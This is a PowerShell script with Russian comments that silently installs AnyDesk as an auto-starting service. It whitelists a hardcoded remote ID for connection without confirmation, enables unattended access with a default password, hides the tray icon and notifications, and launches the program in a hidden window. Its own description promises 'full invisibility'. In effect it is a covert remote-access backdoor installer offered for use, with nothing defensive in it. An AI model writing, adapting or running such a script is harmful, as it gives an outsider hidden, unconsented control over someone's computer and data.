<#
.SYNOPSIS
    Установка AnyDesk с добавлением доверенного ID и полной скрытностью.
.DESCRIPTION
    - Скачивает AnyDesk, принудительно размещает в Program Files.
    - Устанавливает системную службу (автозапуск при старте).
    - Добавляет доверенный ID 1799747747 для подключения без подтверждения.
    - Отключает иконку в трее (полная невидимость).
    - Включает неконтролируемый доступ (unattended access).
    - Запускает AnyDesk скрыто, без окна.
.PARAMETER TrustedID
    ID, который будет добавлен в белый список (по умолчанию 1799747747).
.PARAMETER Password
    Пароль для неконтролируемого доступа (если нужен, но можно оставить пустым).
.EXAMPLE
    .\install.ps1 -TrustedID 1799747747 -Password "MySecret"
#>

param(
    [string]$TrustedID = "1799747747",
    [string]$Password = "YourSecurePass123!"   # замените на свой пароль
)

$DownloadUrl = "https://download.anydesk.com/AnyDesk.exe"

Write-Host "===================================================" -ForegroundColor Cyan
Write-Host "   УСТАНОВКА ANYDESK (СКРЫТАЯ + ДОВЕРЕННЫЙ ID)" -ForegroundColor Cyan
Write-Host "===================================================" -ForegroundColor Cyan

# 1. Определение папки установки (в зависимости от разрядности)
if ([Environment]::Is64BitOperatingSystem) {
    $InstallPath = "${env:ProgramFiles(x86)}\AnyDesk"
} else {
    $InstallPath = "${env:ProgramFiles}\AnyDesk"
}
Write-Host "Целевая папка: $InstallPath" -ForegroundColor Gray

# 2. Создание временной папки для загрузки
$TempDir = Join-Path $env:TEMP "AnyDeskSetup_$(Get-Random)"
New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
$DownloadedExe = Join-Path $TempDir "AnyDesk.exe"

# 3. Скачивание
Write-Host "[1/7] Скачивание AnyDesk..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $DownloadedExe -UseBasicParsing
    Write-Host "   ✅ Скачивание завершено." -ForegroundColor Green
} catch {
    Write-Host "   ❌ Ошибка скачивания: $_" -ForegroundColor Red
    exit 1
}

# 4. Копирование в целевую папку
Write-Host "[2/7] Копирование файлов в $InstallPath ..." -ForegroundColor Cyan
try {
    New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
    Copy-Item -Path $DownloadedExe -Destination (Join-Path $InstallPath "AnyDesk.exe") -Force
    Write-Host "   ✅ Файлы скопированы." -ForegroundColor Green
} catch {
    Write-Host "   ❌ Ошибка копирования: $_" -ForegroundColor Red
    exit 1
}

$TargetExe = Join-Path $InstallPath "AnyDesk.exe"
if (-not (Test-Path $TargetExe)) {
    Write-Host "   ❌ AnyDesk.exe не найден после копирования!" -ForegroundColor Red
    exit 1
}

# 5. Установка службы AnyDesk
Write-Host "[3/7] Установка службы AnyDesk..." -ForegroundColor Cyan
try {
    Start-Process -FilePath $TargetExe -ArgumentList "--install" -Wait -NoNewWindow
    Write-Host "   ✅ Служба установлена." -ForegroundColor Green
} catch {
    Write-Host "   ❌ Ошибка установки службы: $_" -ForegroundColor Red
    exit 1
}

# 6. Ожидание инициализации службы
Write-Host "[4/7] Ожидание запуска службы..." -ForegroundColor Cyan
Start-Sleep -Seconds 15

# 7. Настройка реестра (доверенный ID, скрытие иконки, unattended access)
Write-Host "[5/7] Применение настроек реестра..." -ForegroundColor Cyan
try {
    # Останавливаем процесс, чтобы не было конфликтов (служба продолжит работу)
    Stop-Process -Name "AnyDesk" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2

    # Определяем ветки реестра (для 64-битных систем пишем в обе)
    $regPaths = @("HKLM:\SOFTWARE\AnyDesk")
    if ([Environment]::Is64BitOperatingSystem) {
        $regPaths += "HKLM:\SOFTWARE\WOW6432Node\AnyDesk"
    }

    foreach ($regPath in $regPaths) {
        # Создаём ключ, если его нет
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }

        # Включаем неконтролируемый доступ (unattended access)
        Set-ItemProperty -Path $regPath -Name "ad.security.expose_options" -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $regPath -Name "ad.security.unattended_access" -Value 1 -Type DWord -Force

        # Добавляем доверенный ID (через точку с запятой, если несколько)
        Set-ItemProperty -Path $regPath -Name "ad.anynet.whitelist" -Value $TrustedID -Type String -Force

        # Отключаем иконку в трее
        Set-ItemProperty -Path $regPath -Name "ad.ui.tray_icon" -Value 0 -Type DWord -Force

        # Дополнительно: отключаем все уведомления (опционально)
        Set-ItemProperty -Path $regPath -Name "ad.ui.news" -Value 0 -Type DWord -Force
    }

    Write-Host "   ✅ Настройки реестра применены." -ForegroundColor Green
} catch {
    Write-Host "   ⚠️ Ошибка настройки реестра: $_" -ForegroundColor Yellow
    Write-Host "   Некоторые параметры могут не работать." -ForegroundColor Yellow
}

# 8. Установка пароля (если передан)
if ($Password) {
    Write-Host "[6/7] Установка пароля..." -ForegroundColor Cyan
    try {
        echo $Password | & $TargetExe --set-password
        Write-Host "   ✅ Пароль установлен." -ForegroundColor Green
    } catch {
        Write-Host "   ⚠️ Ошибка установки пароля: $_" -ForegroundColor Yellow
    }
}

# 9. Запуск AnyDesk в фоне (без окна)
Write-Host "[7/7] Запуск AnyDesk..." -ForegroundColor Cyan
try {
    Start-Process -FilePath $TargetExe -ArgumentList "--silent" -WindowStyle Hidden
    Write-Host "   ✅ Процесс запущен скрыто." -ForegroundColor Green
} catch {
    Write-Host "   ⚠️ Не удалось запустить: $_" -ForegroundColor Yellow
}

# 10. Получение ID AnyDesk (с проверкой)
Write-Host "Получение AnyDesk ID..." -ForegroundColor Cyan
$ID = $null
$maxAttempts = 12
$attempt = 0

while ($attempt -lt $maxAttempts) {
    Start-Sleep -Seconds 5
    $ID = & $TargetExe --get-id | Out-String
    $ID = $ID.Trim()
    if ($ID -match "^\d+$" -and $ID -ne "0") {
        Write-Host "   ✅ ID получен: $ID" -ForegroundColor Green
        break
    }
    Write-Host "   ⏳ Ожидание ID (попытка $($attempt+1))..." -ForegroundColor Gray
    $attempt++
}

if (-not $ID -or $ID -eq "0") {
    $ID = "Не удалось определить (возможно, требуется перезагрузка)"
}

# 11. Итог
Write-Host "===================================================" -ForegroundColor Green
Write-Host "✅ УСТАНОВКА ЗАВЕРШЕНА!" -ForegroundColor Green
Write-Host "===================================================" -ForegroundColor Green
Write-Host "🔑 AnyDesk ID: $ID" -ForegroundColor White -BackgroundColor DarkGreen
Write-Host "🔑 Пароль: $Password" -ForegroundColor White
Write-Host "📂 Расположение: $InstallPath" -ForegroundColor Gray
Write-Host "🔄 Служба: AnyDesk (запускается автоматически)" -ForegroundColor Gray
Write-Host "🔓 Неконтролируемый доступ: ВКЛЮЧЁН" -ForegroundColor Green
Write-Host "🔔 Иконка в трее: СКРЫТА" -ForegroundColor Green
Write-Host "🔐 Доверенный ID: $TrustedID добавлен в белый список" -ForegroundColor Green

# 12. Очистка временных файлов
Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue